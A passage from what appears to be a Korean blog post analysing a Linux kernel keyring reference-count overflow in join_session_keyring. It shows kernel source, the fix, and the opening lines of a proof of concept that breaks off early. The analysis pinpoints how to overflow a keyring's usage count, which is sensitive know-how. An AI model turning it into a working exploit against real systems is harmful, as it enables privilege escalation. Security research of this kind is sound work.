메모리가 된다면, 해당 포인터를 리눅스의 Garbage Colllector가 free 시킨다.</p></li></ul><h1 id="source-code-analysis"><a href="#source-code-analysis" class="headerlink" title="source code analysis"></a>source code analysis</h1><ul><li>join_session_keyring 함수를 크게 세 부분으로 나눠서 분석하겠다.<h2 id="part-1-cred-구조체-초기화"><a href="#part-1-cred-구조체-초기화" class="headerlink" title="part 1 : cred 구조체 초기화"></a>part 1 : cred 구조체 초기화</h2></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br></pre></td></tr></table></figure><ul><li>join_session_keyring 함수가 호출되면 prepare_creds()함수를 통해 수정용 cred 구조체 new를 초기화 해준다.</li><li>current_cred()를 통해 현재 작업의 subjective credentials를 액세스 한다.</li></ul><h3 id="prepare-creds"><a href="#prepare-creds" class="headerlink" title="prepare_creds()"></a>prepare_creds()</h3><p><img src="https://user-images.githubusercontent.com/70257118/98334793-07c43c80-2047-11eb-98a0-adaaee9c304d.png" alt="제목 없음"></p><ul><li>Task의 creds는 직접적으로 수정할 수 없어 반드시 copy 후 수정해야 한다.</li><li>prepare_creds()를 호출하여 copy를 준비 한다. (new = prepare_creds())</li><li>수정 후 commit_creds()를 호출하여 커밋한다. (commit_creds(new))</li></ul> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">validate_process_creds();</span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;session_keyring); </span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li> 수정용 cred 구조체를 만들어 return 해준다.</li></ul><h3 id="what-is-struct-cred"><a href="#what-is-struct-cred" class="headerlink" title="what is struct cred?"></a>what is struct cred?</h3><p><img src="https://user-images.githubusercontent.com/70257118/98340730-2cbdad00-2051-11eb-8409-1ff1950ac625.png" alt="1"></p><ul><li>Credentials : 자격증명</li><li>Linux에서는 다음과 같은 Credentials들을 <code>struct cred</code>를 통해 관리한다.<br>  Traditional UNIX credentials.<br>  Capabilities.<br>  Secure management flags (securebits).<br>  Keys and keyrings.<br>  LSM<br>  AF_KEY </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="real-cred-vs-cred"><a href="#real-cred-vs-cred" class="headerlink" title="real_cred vs cred"></a>real_cred vs cred</h3><ul><li>linux에서는 한 task가 다른 task에 접근할 때 작용하는 권한과, 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 분리해 놓았다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><ul><li>real_cred (1) : 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 의미한다.</li><li>cred (2) : 이 task가 다른 task에 접근하거나, 특정 작업을 수행할 때 행사하는 권한을 의미한다.</li></ul><h2 id="part2-name이-NULL일-경우"><a href="#part2-name이-NULL일-경우" class="headerlink" title="part2 : name이 NULL일 경우"></a>part2 : name이 NULL일 경우</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>join_session_keyring()함수의 인자인 name이 없다면, install_session_keyring_to_cred() 함수를 호출한다.</li><li>수정후 commit_creds(new)호출을 통해 수정된 cred를 커밋 시킨다.</li></ul><h3 id="install-session-keyring-to-cred"><a href="#install-session-keyring-to-cred" class="headerlink" title="install_session_keyring_to_cred"></a>install_session_keyring_to_cred</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install a session keyring directly to a credentials struct.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">install_session_keyring_to_cred</span><span class="params">(struct cred *cred, struct key *keyring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line">might_sleep();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create an empty session keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!keyring) &#123;</span><br><span class="line">flags = KEY_ALLOC_QUOTA_OVERRUN;</span><br><span class="line"><span class="keyword">if</span> (cred-&gt;session_keyring)</span><br><span class="line">flags = KEY_ALLOC_IN_QUOTA;</span><br><span class="line"></span><br><span class="line">keyring = keyring_alloc(<span class="string">&quot;_ses&quot;</span>, cred-&gt;uid, cred-&gt;gid, cred,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ,</span><br><span class="line">flags, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(keyring);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">__key_get(keyring);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* install the keyring */</span></span><br><span class="line">old = cred-&gt;session_keyring;</span><br><span class="line">rcu_assign_pointer(cred-&gt;session_keyring, keyring);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old)</span><br><span class="line">key_put(old);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>install_session_keyring_to_cred()함수의 역할은 cred 구조체에 직접적으로 session keyring을 등록한다.</li><li>즉, install_session_keyring_to_cred(new,NULL)은 익명의 keyring을 만들고, 이 keyring을 new cred에 등록한다.</li></ul><h2 id="part3-name이-NULL이-아닐-경우"><a href="#part3-name이-NULL이-아닐-경우" class="headerlink" title="part3 : name이 NULL이 아닐 경우"></a>part3 : name이 NULL이 아닐 경우</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>); </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial; </span><br><span class="line">key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>mutex_lock을 통해 자원 접근을 막는다.</li><li>find_keyring_by_name 함수를 호출해 같은 name의  keyring이 있는지 확인한다.</li><li>이름이 없다면, <ul><li>해당 name으로 keyring을 만든다. (keyring_alloc)</li><li>만든 keyring을 cred 구조체 new에 등록한다. (install_session_keyring_to_cred)</li><li>수정한 내용을 커밋한다. (commit_creds)</li><li>뮤텍스를 해제한다. (mutex_unlock)</li><li>keyring-&gt;usage를 감소시킨다. (key_put)</li><li>새로 생성한 keyring-&gt;serial을 반환한다.</li></ul></li><li>이름이 있다면,<ul><li>goto error2로 이동한다.  </li><li>뮤텍스를 해제한다.</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>여기서 해당 부분이 취약점을 일으키는데, keyring의 이름이 현재 session의 keyring과 같으면 바로 goto error2로 이동하게 된다.</li><li>이 과정에서 keyring-&gt;usage에 대한 Integer OverFlow가 발생한다.</li><li>어떻게 취약점이 발생하는지 알기 위해서는 먼저 find_keyring_by_name 함수를 알아야 한다.</li></ul><h3 id="find-keyring-by-name"><a href="#find-keyring-by-name" class="headerlink" title="find_keyring_by_name"></a>find_keyring_by_name</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct key *<span class="title">find_keyring_by_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">bool</span> skip_perm_check)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">int</span> bucket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!name)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">bucket = keyring_hash(name);</span><br><span class="line"></span><br><span class="line">read_lock(&amp;keyring_name_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (keyring_name_hash[bucket].next) &#123;</span><br><span class="line"><span class="comment">/* search this hash bucket for a keyring with a matching name</span></span><br><span class="line"><span class="comment"> * that&#x27;s readable and that hasn&#x27;t been revoked */</span></span><br><span class="line">list_for_each_entry(keyring,</span><br><span class="line">    &amp;keyring_name_hash[bucket],</span><br><span class="line">    type_data.link</span><br><span class="line">    ) &#123;</span><br><span class="line"><span class="keyword">if</span> (!kuid_has_mapping(current_user_ns(), keyring-&gt;user-&gt;uid))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (test_bit(KEY_FLAG_REVOKED, &amp;keyring-&gt;flags))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(keyring-&gt;description, name) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!skip_perm_check &amp;&amp;</span><br><span class="line">    key_permission(make_key_ref(keyring, <span class="number">0</span>),</span><br><span class="line">   KEY_NEED_SEARCH) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we&#x27;ve got a match but we might end up racing with</span></span><br><span class="line"><span class="comment"> * key_cleanup() if the keyring is currently &#x27;dead&#x27;</span></span><br><span class="line"><span class="comment"> * (ie. it has a zero usage count) */</span></span><br><span class="line"><span class="keyword">if</span> (!atomic_inc_not_zero(&amp;keyring-&gt;usage))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">keyring-&gt;last_used_at = current_kernel_time().tv_sec;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">keyring = ERR_PTR(-ENOKEY);</span><br><span class="line">out:</span><br><span class="line">read_unlock(&amp;keyring_name_lock);</span><br><span class="line"><span class="keyword">return</span> keyring;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>find_keyring_by_name 함수는 list를 돌아가며 같은 이름의 keyring이 있는지 찾아준다.</li><li>여기서 같은 이름이 있다면 마지막 부분에 atomic_inc_not_zero(&amp;keyring-&gt;usage)를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * atomic_inc_not_zero - increment unless the number is zero</span></span><br><span class="line"><span class="comment"> * @v: pointer of type atomic_t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Atomically increments @v by 1, so long as @v is non-zero.</span></span><br><span class="line"><span class="comment"> * Returns non-zero if @v was non-zero, and zero otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> atomic_inc_not_zero</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic_inc_not_zero(v)atomic_add_unless((v), 1, 0)</span></span><br></pre></td></tr></table></figure><ul><li>atomic_inc_not_zero(&amp;keyring-&gt;usage)는 keyring-&gt;usage가 0이 아니면 증가시킨다.</li><li>여기서 증가된 keyring-&gt;usage는 반드시 key_put을 통해 감소시켜야 하는데, 감소시키는 부분이 존재하지 않음을 확인할 수 있다.</li><li>keyring-&gt;usage는 atomic_t == int형 이므로, 계속 증가시킨다면 Integer OverFlow를 발생시킬 수 있다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>패치된 코드를 보면, goto error2로 가기 전에 key_put(keyring)을 통해 증가된 keyring-&gt;usage를 감소시키는 것을 확인할 수 있다.</li><li>이를 통해 Integer OverFlow를 막을 수 있다.</li></ul><h2 id="poc-code"><a href="#poc-code" class="headerlink" title="poc code"></a>poc code</h2><ul><li>취약점을 증명하기 위한 PoC코드는 다음과 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = 